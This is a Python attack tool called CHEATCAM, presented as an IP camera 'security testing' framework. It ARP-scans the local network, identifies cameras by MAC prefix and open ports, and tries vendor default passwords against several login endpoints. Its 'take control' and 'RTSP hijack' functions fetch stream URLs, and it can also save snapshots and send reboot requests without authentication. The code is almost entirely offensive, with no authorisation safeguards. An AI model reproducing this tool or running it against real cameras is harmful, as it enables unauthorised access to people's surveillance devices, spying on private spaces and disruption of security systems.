#!/usr/bin/env python3
"""
CHEATCAM v2.0 - Advanced Camera Security Testing Framework
Professional IP Camera Assessment Tool

Author: F1REW0LF
License: MIT
"""

import sys
import os
import re
import json
import time
import socket
import struct
import random
import hashlib
import base64
import threading
import queue
import signal
import subprocess
import ssl
import urllib.request
import urllib.parse
from datetime import datetime
from typing import Dict, List, Optional, Tuple, Any
from collections import defaultdict
import argparse
import http.client
import xml.etree.ElementTree as ET
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    from scapy.all import *
    from scapy.layers.inet import IP, TCP, UDP
    from scapy.layers.l2 import ARP, Ether
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

VERSION = "2.0.0"
AUTHOR = "F1REW0LF"
LICENSE = "MIT"

# ============================[ COLORS ]================================
class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    GOLD = '\033[93m'
    NEON = '\033[96m'
    WHITE = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    MAGENTA = '\033[95m'

def cprint(text, color=Colors.WHITE, bold=False):
    if bold:
        print(f"{Colors.BOLD}{color}{text}{Colors.WHITE}")
    else:
        print(f"{color}{text}{Colors.WHITE}")

def print_banner():
    banner = f"""
{Colors.CYAN}{Colors.BOLD}     ██████╗██╗  ██╗███████╗ █████╗ ████████╗ ██████╗ █████╗ ███╗   ███╗
    ██╔════╝██║  ██║██╔════╝██╔══██╗╚══██╔══╝██╔════╝██╔══██╗████╗ ████║
    ██║     ███████║█████╗  ███████║   ██║   ██║     ███████║██╔████╔██║
    ██║     ██╔══██║██╔══╝  ██╔══██║   ██║   ██║     ██╔══██║██║╚██╔╝██║
    ╚██████╗██║  ██║███████╗██║  ██║   ██║   ╚██████╗██║  ██║██║ ╚═╝ ██║
     ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝    ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝
                                                   
{Colors.NEON}          ADVANCED CAMERA SECURITY TESTING{Colors.WHITE}
{Colors.CYAN}    Professional IP Camera Assessment Tool{Colors.WHITE}
{Colors.YELLOW}    Version {VERSION} | Author: {AUTHOR} | {LICENSE}{Colors.WHITE}
    """
    print(banner)
    print("=" * 80)

# ============================[ UTILITY FUNCTIONS ]================================
class Utils:
    @staticmethod
    def get_local_ip():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    @staticmethod
    def scan_ports(ip, ports, timeout=1):
        open_ports = []
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = {executor.submit(Utils._check_port, ip, port, timeout): port for port in ports}
            for future in as_completed(futures):
                port = futures[future]
                if future.result():
                    open_ports.append(port)
        return open_ports
    
    @staticmethod
    def _check_port(ip, port, timeout):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((ip, port))
            sock.close()
            return result == 0
        except:
            return False

# ============================[ CAMERA DISCOVERY ]================================
class CameraDiscovery:
    def __init__(self, interface='eth0'):
        self.interface = interface
        self.cameras = {}
        self.camera_macs = {
            '00:0e:8f': 'Panasonic', '00:18:4a': 'Samsung',
            '00:1a:3f': 'Sony', '00:1c:bf': 'Samsung',
            '00:1d:aa': 'Vivotek', '00:22:75': 'Arecont',
            '00:24:1d': 'Mobotix', '00:26:22': 'ACTi',
            '00:30:48': 'GE Security', '24:0a:c4': 'Hikvision',
            '30:ae:a4': 'Dahua', 'a4:14:37': 'Axis',
            'bc:dd:c2': 'TP-Link'
        }
        self.http_ports = [80, 443, 8080, 8443, 8000, 8001, 8081, 8888]
        self.rtsp_ports = [554, 8554, 1554, 8555]
    
    def discover(self):
        cprint("\n[DISCOVER] Scanning for IP cameras...", Colors.BLUE)
        
        if not SCAPY_AVAILABLE:
            cprint("[!] Scapy not available. Install: pip3 install scapy", Colors.RED)
            return {}
        
        network = ".".join(Utils.get_local_ip().split('.')[:3]) + ".0/24"
        hosts = self._arp_scan(network)
        
        if not hosts:
            cprint("[!] No hosts found", Colors.YELLOW)
            return {}
        
        cprint(f"[+] Found {len(hosts)} active hosts", Colors.GREEN)
        
        for host in hosts:
            ip = host.get('ip')
            mac = host.get('mac')
            
            manufacturer = self._check_mac(mac)
            http_ports = Utils.scan_ports(ip, self.http_ports)
            rtsp_ports = Utils.scan_ports(ip, self.rtsp_ports)
            
            if http_ports or rtsp_ports:
                self.cameras[ip] = {
                    'ip': ip,
                    'mac': mac,
                    'manufacturer': manufacturer,
                    'http_ports': http_ports,
                    'rtsp_ports': rtsp_ports,
                    'onvif': self._check_onvif(ip, http_ports)
                }
                
                cprint(f"[+] Camera found: {ip} ({manufacturer})", Colors.GREEN)
                cprint(f"    HTTP: {http_ports}", Colors.DIM)
                cprint(f"    RTSP: {rtsp_ports}", Colors.DIM)
        
        return self.cameras
    
    def _arp_scan(self, network):
        try:
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network), 
                         timeout=3, verbose=False)
            return [{'ip': r.psrc, 'mac': r.hwsrc} for _, r in ans]
        except:
            return []
    
    def _check_mac(self, mac):
        if not mac:
            return "Unknown"
        mac_prefix = mac[:8].upper()
        for prefix, manufacturer in self.camera_macs.items():
            if mac_prefix.startswith(prefix.upper()):
                return manufacturer
        return "Unknown"
    
    def _check_onvif(self, ip, http_ports):
        for port in http_ports:
            try:
                conn = http.client.HTTPConnection(ip, port, timeout=2)
                conn.request("GET", "/onvif/device_service")
                if conn.getresponse().status == 200:
                    return True
            except:
                pass
        return False

# ============================[ CAMERA EXPLOIT ]================================
class CameraExploit:
    def __init__(self, camera_info):
        self.camera = camera_info
        self.ip = camera_info['ip']
        self.ports = camera_info.get('http_ports', [80])
        self.manufacturer = camera_info.get('manufacturer', 'Unknown')
        self.credentials = self._get_default_credentials()
    
    def _get_default_credentials(self):
        defaults = {
            'Hikvision': [('admin', '12345'), ('admin', 'admin')],
            'Dahua': [('admin', 'admin'), ('admin', '123456')],
            'TP-Link': [('admin', 'admin'), ('admin', '1234')],
            'Axis': [('root', 'pass'), ('admin', 'admin')],
            'Samsung': [('admin', 'admin'), ('admin', '4321')],
            'Sony': [('admin', 'admin'), ('admin', '1234')],
            'Panasonic': [('admin', 'admin'), ('admin', '12345')],
            'Vivotek': [('admin', 'admin'), ('admin', '1234')],
            'D-Link': [('admin', 'admin'), ('admin', '1234')],
        }
        return defaults.get(self.manufacturer, [('admin', 'admin'), ('admin', '1234')])
    
    def try_default_credentials(self):
        cprint(f"\n[EXPLOIT] Trying default credentials on {self.ip}", Colors.YELLOW)
        
        for username, password in self.credentials:
            cprint(f"[*] Trying: {username}:{password}", Colors.DIM)
            for port in self.ports:
                if self._login_http(username, password, port):
                    cprint(f"[+] Login successful: {username}:{password}", Colors.GREEN)
                    return {'username': username, 'password': password}
        
        cprint("[!] Default credentials failed", Colors.YELLOW)
        return None
    
    def _login_http(self, username, password, port):
        try:
            endpoints = ['/login', '/admin/login', '/cgi-bin/login', '/api/login']
            for endpoint in endpoints:
                conn = http.client.HTTPConnection(self.ip, port, timeout=3)
                data = urllib.parse.urlencode({'username': username, 'password': password})
                conn.request("POST", endpoint, body=data,
                           headers={"Content-Type": "application/x-www-form-urlencoded"})
                response = conn.getresponse()
                if response.status == 200:
                    body = response.read().decode('utf-8', errors='ignore')
                    if 'success' in body.lower() or 'welcome' in body.lower():
                        return True
        except:
            pass
        return False
    
    def rtsp_hijack(self):
        cprint(f"\n[RTSP] Attempting RTSP hijack on {self.ip}", Colors.YELLOW)
        
        for port in self.camera.get('rtsp_ports', [554]):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((self.ip, port))
                sock.send(b"OPTIONS rtsp://example.com RTSP/1.0\r\nCSeq: 1\r\n\r\n")
                if b"RTSP" in sock.recv(1024):
                    cprint(f"[+] RTSP service on port {port}", Colors.GREEN)
                    stream_url = f"rtsp://{self.ip}:{port}/stream1"
                    cprint(f"[+] Stream URL: {stream_url}", Colors.GREEN)
                    return stream_url
            except:
                pass
        
        cprint("[!] RTSP hijack failed", Colors.RED)
        return None
    
    def take_control(self):
        cprint(f"\n[CONTROL] Taking control of {self.ip}", Colors.RED, bold=True)
        
        control_methods = []
        
        creds = self.try_default_credentials()
        if creds:
            control_methods.append(f"Credentials: {creds['username']}:{creds['password']}")
        
        stream = self.rtsp_hijack()
        if stream:
            control_methods.append(f"RTSP stream: {stream}")
        
        if control_methods:
            cprint(f"[+] Control achieved:", Colors.GREEN)
            for method in control_methods:
                cprint(f"    - {method}", Colors.CYAN)
        else:
            cprint("[!] Could not achieve control", Colors.RED)
        
        return control_methods

# ============================[ CAMERA CONTROL ]================================
class CameraControl:
    def __init__(self, camera):
        self.camera = camera
        self.ip = camera['ip']
    
    def view_stream(self):
        cprint(f"\n[VIEW] Opening stream for {self.ip}", Colors.CYAN)
        rtsp_url = f"rtsp://{self.ip}:554/stream1"
        cprint(f"[+] RTSP URL: {rtsp_url}", Colors.GREEN)
        
        try:
            subprocess.Popen(['vlc', rtsp_url], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            cprint("[+] VLC opened", Colors.GREEN)
        except:
            cprint("[!] VLC not available. Use RTSP URL manually", Colors.YELLOW)
        
        return rtsp_url
    
    def snapshot(self):
        cprint(f"\n[SNAPSHOT] Capturing snapshot from {self.ip}", Colors.CYAN)
        
        for port in self.camera.get('http_ports', [80]):
            for path in ['/snapshot.jpg', '/image.jpg', '/cgi-bin/snapshot']:
                try:
                    conn = http.client.HTTPConnection(self.ip, port, timeout=3)
                    conn.request("GET", path)
                    response = conn.getresponse()
                    if response.status == 200:
                        data = response.read()
                        if len(data) > 1000:
                            filename = f"snapshot_{self.ip}_{int(time.time())}.jpg"
                            with open(filename, 'wb') as f:
                                f.write(data)
                            cprint(f"[+] Snapshot saved: {filename}", Colors.GREEN)
                            return filename
                except:
                    pass
        
        cprint("[!] Could not capture snapshot", Colors.RED)
        return None
    
    def reboot(self):
        cprint(f"\n[REBOOT] Rebooting {self.ip}", Colors.RED)
        for port in self.camera.get('http_ports', [80]):
            for path in ['/cgi-bin/reboot', '/admin/reboot']:
                try:
                    conn = http.client.HTTPConnection(self.ip, port, timeout=3)
                    conn.request("GET", path)
                    if conn.getresponse().status == 200:
                        cprint("[+] Reboot command sent", Colors.GREEN)
                        return True
                except:
                    pass
        cprint("[!] Could not reboot camera", Colors.RED)
        return False

# ============================[ MAIN FRAMEWORK ]================================
class CheatCam:
    def __init__(self, interface='eth0'):
        self.interface = interface
        self.cameras = {}
        self.running = True
        signal.signal(signal.SIGINT, self.signal_handler)
    
    def signal_handler(self, signum, frame):
        cprint("\n[!] Exiting...", Colors.RED)
        self.running = False
        sys.exit(0)
    
    def show_menu(self):
        print(f"""
{Colors.BLUE}{'='*60}{Colors.WHITE}
{Colors.BOLD}CHEATCAM - Camera Security Testing{Colors.WHITE}
{Colors.BLUE}{'='*60}{Colors.WHITE}
[1] Discover Cameras
[2] List Cameras
[3] Exploit Camera
[4] Take Control
[5] View Stream
[6] Capture Snapshot
[7] Reboot Camera
[8] Exit
""")
    
    def discover_cameras(self):
        discovery = CameraDiscovery(self.interface)
        self.cameras = discovery.discover()
    
    def list_cameras(self):
        if not self.cameras:
            cprint("[!] No cameras discovered", Colors.YELLOW)
            return
        
        print("\n" + "="*60)
        cprint(" DISCOVERED CAMERAS", Colors.PURPLE, bold=True)
        print("="*60)
        for ip, info in self.cameras.items():
            print(f"{ip} - {info.get('manufacturer', 'Unknown')}")
            print(f"  HTTP: {info.get('http_ports', [])}")
            print(f"  RTSP: {info.get('rtsp_ports', [])}")
        print("="*60)
    
    def select_camera(self):
        if not self.cameras:
            cprint("[!] No cameras", Colors.RED)
            return None
        
        self.list_cameras()
        ip = input(f"{Colors.CYAN}[>] Enter IP: {Colors.WHITE}").strip()
        
        if ip in self.cameras:
            return self.cameras[ip]
        cprint("[-] Camera not found", Colors.RED)
        return None
    
    def exploit_camera(self):
        camera = self.select_camera()
        if camera:
            exploit = CameraExploit(camera)
            exploit.try_default_credentials()
            exploit.rtsp_hijack()
    
    def take_control(self):
        camera = self.select_camera()
        if camera:
            exploit = CameraExploit(camera)
            exploit.take_control()
    
    def view_stream(self):
        camera = self.select_camera()
        if camera:
            control = CameraControl(camera)
            control.view_stream()
    
    def capture_snapshot(self):
        camera = self.select_camera()
        if camera:
            control = CameraControl(camera)
            control.snapshot()
    
    def reboot_camera(self):
        camera = self.select_camera()
        if camera:
            control = CameraControl(camera)
            control.reboot()
    
    def run(self):
        print_banner()
        
        cprint(f"[+] Local IP: {Utils.get_local_ip()}", Colors.GREEN)
        
        while self.running:
            self.show_menu()
            choice = input(f"{Colors.CYAN}[>] Select: {Colors.WHITE}").strip()
            
            if choice == '1':
                self.discover_cameras()
            elif choice == '2':
                self.list_cameras()
            elif choice == '3':
                self.exploit_camera()
            elif choice == '4':
                self.take_control()
            elif choice == '5':
                self.view_stream()
            elif choice == '6':
                self.capture_snapshot()
            elif choice == '7':
                self.reboot_camera()
            elif choice == '8':
                cprint("[*] Exiting...", Colors.GREEN)
                break
            else:
                cprint("[-] Invalid selection", Colors.RED)

# ============================[ MAIN ]================================
if __name__ == "__main__":
    if os.geteuid() != 0:
        cprint("[!] Root privileges required", Colors.RED)
        sys.exit(1)
    
    parser = argparse.ArgumentParser(description="CHEATCAM - Camera Security Testing")
    parser.add_argument("-i", "--interface", default="eth0", help="Network interface")
    parser.add_argument("-d", "--discover", action="store_true", help="Discover only")
    parser.add_argument("-e", "--exploit", help="Exploit camera by IP")
    
    args = parser.parse_args()
    
    tool = CheatCam(args.interface)
    
    if args.discover:
        tool.discover_cameras()
        tool.list_cameras()
    elif args.exploit:
        tool.discover_cameras()
        if args.exploit in tool.cameras:
            exploit = CameraExploit(tool.cameras[args.exploit])
            exploit.take_control()
        else:
            cprint("[-] Camera not found", Colors.RED)
    else:
        tool.run()
